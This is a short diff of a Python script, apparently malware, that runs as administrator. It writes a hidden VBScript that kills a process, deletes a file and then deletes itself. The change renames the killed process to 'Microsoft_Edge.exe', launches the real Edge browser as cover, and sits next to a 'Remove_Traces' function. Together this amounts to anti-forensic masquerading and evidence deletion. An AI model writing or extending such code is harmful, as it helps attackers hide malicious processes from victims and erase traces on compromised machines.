@@ -59,13 +59,16 @@ if run_as_admin():
             pass
     def Delete_File(DriveLetter,File_Path):
         Bat_File=rf"{DriveLetter}del.vbs"
+        edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
         with open(Bat_File,"w") as File:
             File.write(rf"""Set objShell = CreateObject("WScript.Shell")
-objShell.Run "taskkill /F /IM P15.exe", 0, True
+objShell.Run "taskkill /F /IM Microsoft_Edge.exe", 0, True
 objShell.Run "cmd /c del {File_Path}", 0, True
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 objFSO.DeleteFile WScript.ScriptFullName
-""")
+""")    
+
+        subprocess.run([edge_path])
         subprocess.run(["cscript.exe", "//Nologo", Bat_File], shell=True)
             
     def Remove_Traces(Drive_Letter):
